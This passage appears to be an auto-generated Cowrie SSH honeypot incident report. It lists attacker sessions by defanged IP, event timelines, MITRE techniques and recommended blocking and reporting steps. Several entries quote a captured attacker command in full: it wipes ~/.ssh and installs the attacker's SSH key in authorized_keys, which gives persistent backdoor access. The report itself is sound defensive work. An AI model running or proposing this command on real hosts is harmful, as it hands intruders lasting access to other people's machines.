| `2026-06-30 03:26:27` | `cowrie.client.kex` |
| `2026-06-30 03:26:27` | `cowrie.login.success` |
| `2026-06-30 03:26:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.192[.]53` to AbuseIPDB if not already reported
- [ ] Block `69.164.192[.]53` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef5cc2d91778

| Field | Detail |
|---|---|
| **Source IP** | `69.164.192[.]53` |
| **First Seen** | 2026-06-30 03:26 |
| **Last Seen** | 2026-06-30 03:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:26:27` | `cowrie.session.connect` |
| `2026-06-30 03:26:27` | `cowrie.client.version` |
| `2026-06-30 03:26:27` | `cowrie.client.kex` |
| `2026-06-30 03:26:27` | `cowrie.login.success` |
| `2026-06-30 03:26:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.192[.]53` to AbuseIPDB if not already reported
- [ ] Block `69.164.192[.]53` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-778fb841edd3

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-06-30 03:28 |
| **Last Seen** | 2026-06-30 03:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:28:05` | `cowrie.session.connect` |
| `2026-06-30 03:28:05` | `cowrie.client.version` |
| `2026-06-30 03:28:06` | `cowrie.client.kex` |
| `2026-06-30 03:28:06` | `cowrie.login.success` |
| `2026-06-30 03:28:07` | `cowrie.session.params` |
| `2026-06-30 03:28:07` | `cowrie.command.input` |
| `2026-06-30 03:28:07` | `cowrie.log.closed` |
| `2026-06-30 03:28:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0af208b7d48b

| Field | Detail |
|---|---|
| **Source IP** | `147.15.20[.]173` |
| **First Seen** | 2026-06-30 03:28 |
| **Last Seen** | 2026-06-30 03:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:28:27` | `cowrie.session.connect` |
| `2026-06-30 03:28:27` | `cowrie.client.version` |
| `2026-06-30 03:28:27` | `cowrie.client.kex` |
| `2026-06-30 03:28:28` | `cowrie.login.success` |
| `2026-06-30 03:28:29` | `cowrie.session.params` |
| `2026-06-30 03:28:29` | `cowrie.command.input` |
| `2026-06-30 03:28:29` | `cowrie.command.failed` |
| `2026-06-30 03:28:29` | `cowrie.log.closed` |
| `2026-06-30 03:28:30` | `cowrie.session.params` |
| `2026-06-30 03:28:30` | `cowrie.command.input` |
| `2026-06-30 03:28:30` | `cowrie.session.file_download` |
| `2026-06-30 03:28:30` | `cowrie.log.closed` |
| `2026-06-30 03:28:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.15.20[.]173` to AbuseIPDB if not already reported
- [ ] Block `147.15.20[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-758b8e53b792

| Field | Detail |
|---|---|
| **Source IP** | `147.15.20[.]173` |
| **First Seen** | 2026-06-30 03:28 |
| **Last Seen** | 2026-06-30 03:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:28:31` | `cowrie.session.connect` |
| `2026-06-30 03:28:31` | `cowrie.client.version` |
| `2026-06-30 03:28:31` | `cowrie.client.kex` |
| `2026-06-30 03:28:32` | `cowrie.login.success` |
| `2026-06-30 03:28:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.15.20[.]173` to AbuseIPDB if not already reported
- [ ] Block `147.15.20[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ad98b5909bf

| Field | Detail |
|---|---|
| **Source IP** | `147.15.20[.]173` |
| **First Seen** | 2026-06-30 03:28 |
| **Last Seen** | 2026-06-30 03:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:28:32` | `cowrie.session.connect` |
| `2026-06-30 03:28:32` | `cowrie.client.version` |
| `2026-06-30 03:28:32` | `cowrie.client.kex` |
| `2026-06-30 03:28:33` | `cowrie.login.success` |
| `2026-06-30 03:28:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.15.20[.]173` to AbuseIPDB if not already reported
- [ ] Block `147.15.20[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13574c0a2898

| Field | Detail |
|---|---|
| **Source IP** | `49.238.167[.]125` |
| **First Seen** | 2026-06-30 03:30 |
| **Last Seen** | 2026-06-30 03:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:30:59` | `cowrie.session.connect` |
| `2026-06-30 03:30:59` | `cowrie.client.version` |
| `2026-06-30 03:30:59` | `cowrie.client.kex` |
| `2026-06-30 03:31:00` | `cowrie.login.success` |
| `2026-06-30 03:31:01` | `cowrie.session.params` |
| `2026-06-30 03:31:01` | `cowrie.command.input` |
| `2026-06-30 03:31:01` | `cowrie.command.failed` |
| `2026-06-30 03:31:02` | `cowrie.log.closed` |
| `2026-06-30 03:31:02` | `cowrie.session.params` |
| `2026-06-30 03:31:02` | `cowrie.command.input` |
| `2026-06-30 03:31:03` | `cowrie.session.file_download` |
| `2026-06-30 03:31:03` | `cowrie.log.closed` |
| `2026-06-30 03:31:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.238.167[.]125` to AbuseIPDB if not already reported
- [ ] Block `49.238.167[.]125` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a84cee62cd8

| Field | Detail |
|---|---|
| **Source IP** | `49.238.167[.]125` |
| **First Seen** | 2026-06-30 03:31 |
| **Last Seen** | 2026-06-30 03:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:31:03` | `cowrie.session.connect` |
| `2026-06-30 03:31:03` | `cowrie.client.version` |
| `2026-06-30 03:31:03` | `cowrie.client.kex` |
| `2026-06-30 03:31:04` | `cowrie.login.success` |
| `2026-06-30 03:31:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.238.167[.]125` to AbuseIPDB if not already reported
- [ ] Block `49.238.167[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-200890cb0666

| Field | Detail |
|---|---|
| **Source IP** | `49.238.167[.]125` |
| **First Seen** | 2026-06-30 03:31 |
| **Last Seen** | 2026-06-30 03:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:31:04` | `cowrie.session.connect` |
| `2026-06-30 03:31:04` | `cowrie.client.version` |
| `2026-06-30 03:31:04` | `cowrie.client.kex` |
| `2026-06-30 03:31:05` | `cowrie.login.success` |
| `2026-06-30 03:31:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.238.167[.]125` to AbuseIPDB if not already reported
- [ ] Block `49.238.167[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4c2e6bb2608

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 03:31 |
| **Last Seen** | 2026-06-30 03:31 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:31:34` | `cowrie.session.connect` |
| `2026-06-30 03:31:35` | `cowrie.client.version` |
| `2026-06-30 03:31:35` | `cowrie.client.kex` |
| `2026-06-30 03:31:42` | `cowrie.login.success` |
| `2026-06-30 03:31:45` | `cowrie.session.params` |
| `2026-06-30 03:31:45` | `cowrie.command.input` |
| `2026-06-30 03:31:47` | `cowrie.log.closed` |
| `2026-06-30 03:31:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-603be337a449

| Field | Detail |
|---|---|
| **Source IP** | `201.16.238[.]49` |
| **First Seen** | 2026-06-30 03:32 |
| **Last Seen** | 2026-06-30 03:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:32:04` | `cowrie.session.connect` |
| `2026-06-30 03:32:04` | `cowrie.client.version` |
| `2026-06-30 03:32:04` | `cowrie.client.kex` |
| `2026-06-30 03:32:05` | `cowrie.login.success` |
| `2026-06-30 03:32:06` | `cowrie.session.params` |
| `2026-06-30 03:32:06` | `cowrie.command.input` |
| `2026-06-30 03:32:06` | `cowrie.command.failed` |
| `2026-06-30 03:32:06` | `cowrie.log.closed` |
| `2026-06-30 03:32:07` | `cowrie.session.params` |
| `2026-06-30 03:32:07` | `cowrie.command.input` |
| `2026-06-30 03:32:07` | `cowrie.session.file_download` |
| `2026-06-30 03:32:07` | `cowrie.log.closed` |
| `2026-06-30 03:32:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.16.238[.]49` to AbuseIPDB if not already reported
- [ ] Block `201.16.238[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-794f8d904121

| Field | Detail |
|---|---|
| **Source IP** | `201.16.238[.]49` |
| **First Seen** | 2026-06-30 03:32 |
| **Last Seen** | 2026-06-30 03:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:32:07` | `cowrie.session.connect` |
| `2026-06-30 03:32:07` | `cowrie.client.version` |
| `2026-06-30 03:32:07` | `cowrie.client.kex` |
| `2026-06-30 03:32:07` | `cowrie.login.success` |
| `2026-06-30 03:32:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.16.238[.]49` to AbuseIPDB if not already reported
- [ ] Block `201.16.238[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a65d2006c18e

| Field | Detail |
|---|---|
| **Source IP** | `201.16.238[.]49` |
| **First Seen** | 2026-06-30 03:32 |
| **Last Seen** | 2026-06-30 03:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:32:08` | `cowrie.session.connect` |
| `2026-06-30 03:32:08` | `cowrie.client.version` |
| `2026-06-30 03:32:08` | `cowrie.client.kex` |
| `2026-06-30 03:32:08` | `cowrie.login.success` |
| `2026-06-30 03:32:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.16.238[.]49` to AbuseIPDB if not already reported
- [ ] Block `201.16.238[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db0ff4862d49

| Field | Detail |
|---|---|
| **Source IP** | `36.111.40[.]138` |
| **First Seen** | 2026-06-30 03:33 |
| **Last Seen** | 2026-06-30 03:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:33:38` | `cowrie.session.connect` |
| `2026-06-30 03:33:38` | `cowrie.client.version` |
| `2026-06-30 03:33:38` | `cowrie.client.kex` |
| `2026-06-30 03:33:40` | `cowrie.login.success` |
| `2026-06-30 03:33:41` | `cowrie.session.params` |
| `2026-06-30 03:33:41` | `cowrie.command.input` |
| `2026-06-30 03:33:41` | `cowrie.command.failed` |
| `2026-06-30 03:33:41` | `cowrie.log.closed` |
| `2026-06-30 03:33:42` | `cowrie.session.params` |
| `2026-06-30 03:33:42` | `cowrie.command.input` |
| `2026-06-30 03:33:42` | `cowrie.session.file_download` |
| `2026-06-30 03:33:42` | `cowrie.log.closed` |
| `2026-06-30 03:33:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.111.40[.]138` to AbuseIPDB if not already reported
- [ ] Block `36.111.40[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78ed93c2dae6

| Field | Detail |
|---|---|
| **Source IP** | `36.111.40[.]138` |
| **First Seen** | 2026-06-30 03:33 |
| **Last Seen** | 2026-06-30 03:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:33:43` | `cowrie.session.connect` |
| `2026-06-30 03:33:43` | `cowrie.client.version` |
| `2026-06-30 03:33:43` | `cowrie.client.kex` |
| `2026-06-30 03:33:44` | `cowrie.login.success` |
| `2026-06-30 03:33:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.111.40[.]138` to AbuseIPDB if not already reported
- [ ] Block `36.111.40[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b6bcbf18406

| Field | Detail |
|---|---|
| **Source IP** | `36.111.40[.]138` |
| **First Seen** | 2026-06-30 03:33 |
| **Last Seen** | 2026-06-30 03:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:33:44` | `cowrie.session.connect` |
| `2026-06-30 03:33:44` | `cowrie.client.version` |
| `2026-06-30 03:33:44` | `cowrie.client.kex` |
| `2026-06-30 03:33:45` | `cowrie.login.success` |
| `2026-06-30 03:33:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.111.40[.]138` to AbuseIPDB if not already reported
- [ ] Block `36.111.40[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45dbc00c1af0

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 03:40 |
| **Last Seen** | 2026-06-30 03:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:40:10` | `cowrie.session.connect` |
| `2026-06-30 03:40:10` | `cowrie.client.version` |
| `2026-06-30 03:40:10` | `cowrie.client.kex` |
| `2026-06-30 03:40:12` | `cowrie.login.success` |
| `2026-06-30 03:40:14` | `cowrie.session.params` |
| `2026-06-30 03:40:14` | `cowrie.command.input` |
| `2026-06-30 03:40:14` | `cowrie.log.closed` |
| `2026-06-30 03:40:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0eea23c2e57

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 03:43 |
| **Last Seen** | 2026-06-30 03:43 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:43:34` | `cowrie.session.connect` |
| `2026-06-30 03:43:35` | `cowrie.client.version` |
| `2026-06-30 03:43:35` | `cowrie.client.kex` |
| `2026-06-30 03:43:42` | `cowrie.login.success` |
| `2026-06-30 03:43:45` | `cowrie.session.params` |
| `2026-06-30 03:43:45` | `cowrie.command.input` |
| `2026-06-30 03:43:46` | `cowrie.log.closed` |
| `2026-06-30 03:43:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f97d16f68c85

| Field | Detail |
|---|---|
| **Source IP** | `45.207.8[.]63` |
| **First Seen** | 2026-06-30 03:44 |
| **Last Seen** | 2026-06-30 03:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:44:42` | `cowrie.session.connect` |
| `2026-06-30 03:44:42` | `cowrie.client.version` |
| `2026-06-30 03:44:42` | `cowrie.client.kex` |
| `2026-06-30 03:44:43` | `cowrie.login.success` |
| `2026-06-30 03:44:44` | `cowrie.session.params` |
| `2026-06-30 03:44:44` | `cowrie.command.input` |
| `2026-06-30 03:44:44` | `cowrie.command.failed` |
| `2026-06-30 03:44:44` | `cowrie.log.closed` |
| `2026-06-30 03:44:45` | `cowrie.session.params` |
| `2026-06-30 03:44:45` | `cowrie.command.input` |
| `2026-06-30 03:44:45` | `cowrie.session.file_download` |
| `2026-06-30 03:44:45` | `cowrie.log.closed` |
| `2026-06-30 03:44:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.207.8[.]63` to AbuseIPDB if not already reported
- [ ] Block `45.207.8[.]63` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e003d1c44816

| Field | Detail |
|---|---|
| **Source IP** | `45.207.8[.]63` |
| **First Seen** | 2026-06-30 03:44 |
| **Last Seen** | 2026-06-30 03:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:44:45` | `cowrie.session.connect` |
| `2026-06-30 03:44:45` | `cowrie.client.version` |
| `2026-06-30 03:44:46` | `cowrie.client.kex` |
| `2026-06-30 03:44:47` | `cowrie.login.success` |
| `2026-06-30 03:44:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.207.8[.]63` to AbuseIPDB if not already reported
- [ ] Block `45.207.8[.]63` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-313a92809503

| Field | Detail |
|---|---|
| **Source IP** | `45.207.8[.]63` |
| **First Seen** | 2026-06-30 03:44 |
| **Last Seen** | 2026-06-30 03:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:44:47` | `cowrie.session.connect` |
| `2026-06-30 03:44:47` | `cowrie.client.version` |
| `2026-06-30 03:44:47` | `cowrie.client.kex` |
| `2026-06-30 03:44:48` | `cowrie.login.success` |
| `2026-06-30 03:44:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.207.8[.]63` to AbuseIPDB if not already reported
- [ ] Block `45.207.8[.]63` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9eb2eeb0e47

| Field | Detail |
|---|---|
| **Source IP** | `43.110.38[.]5` |
| **First Seen** | 2026-06-30 03:48 |
| **Last Seen** | 2026-06-30 03:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:48:00` | `cowrie.session.connect` |
| `2026-06-30 03:48:00` | `cowrie.client.version` |
| `2026-06-30 03:48:00` | `cowrie.client.kex` |
| `2026-06-30 03:48:02` | `cowrie.login.success` |
| `2026-06-30 03:48:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.110.38[.]5` to AbuseIPDB if not already reported
- [ ] Block `43.110.38[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6562c82cc452

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-06-30 03:48 |
| **Last Seen** | 2026-06-30 03:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:48:03` | `cowrie.session.connect` |
| `2026-06-30 03:48:03` | `cowrie.client.version` |
| `2026-06-30 03:48:04` | `cowrie.client.kex` |
| `2026-06-30 03:48:04` | `cowrie.login.success` |
| `2026-06-30 03:48:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73da207e72ef

